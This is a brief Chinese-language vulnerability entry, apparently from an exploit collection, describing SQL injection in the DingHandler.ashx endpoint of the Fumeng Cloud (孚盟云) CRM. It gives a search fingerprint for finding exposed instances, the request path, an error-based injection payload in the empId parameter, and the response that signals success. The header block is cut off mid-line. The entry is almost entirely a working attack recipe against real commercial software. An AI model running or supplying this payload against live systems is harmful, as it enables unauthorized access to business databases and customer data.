# 孚盟云CRMDingHandler存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /m/Dingding/Ajax/DingHandler.ashx HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
method=getEmpAllMouldByEmpId&empId=')and 1<user--
```
- **响应特征**：200 nvachar